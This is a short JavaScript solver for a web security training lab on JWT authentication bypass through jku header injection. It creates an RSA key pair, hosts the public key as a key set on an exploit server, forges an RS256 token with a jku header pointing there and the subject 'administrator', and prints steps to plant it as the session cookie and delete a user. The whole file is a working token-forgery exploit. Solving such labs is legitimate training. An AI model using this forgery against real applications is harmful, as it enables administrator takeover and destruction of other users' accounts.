import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { runTasks } from "../../../utils/runTasks.js";
import { JWT } from "../utils/JWT.js";
import { generateKeyPairSync } from "node:crypto";
import { ExploitServer } from "../../../utils/exploitServer.js";

const { labUrl, httpClient } = getParsedInputFromUser({
  description: "Lab: JWT authentication bypass via jku header injection",
  allowProxy: true,
});

runTasks([task]);

async function task() {
  console.log(`
To solve the lab:
  1. Edit your browser cookie for the lab site with key "session" and value "${await createAdminJwtWithJkuInjected()}"
  2. Go to admin page:
  "${labUrl}admin"
  3. Delete carlos's account
`);
}

async function createAdminJwtWithJkuInjected() {
  const { publicKey, privateKey } = generateKeyPairSync("rsa", {
    modulusLength: 2048,
  });
  const jwk = publicKey.export({ format: "jwk" });
  const jkwSet = { keys: [jwk] };
  const exploitServer = await ExploitServer.create(labUrl, httpClient);
  await exploitServer.storeExploit(JSON.stringify(jkwSet));
  const header = { alg: "RS256", jku: `${exploitServer.url}/exploit` };
  const payload = { sub: "administrator" };
  return new JWT({ header, payload }).signWithPrivateKey(privateKey);
}
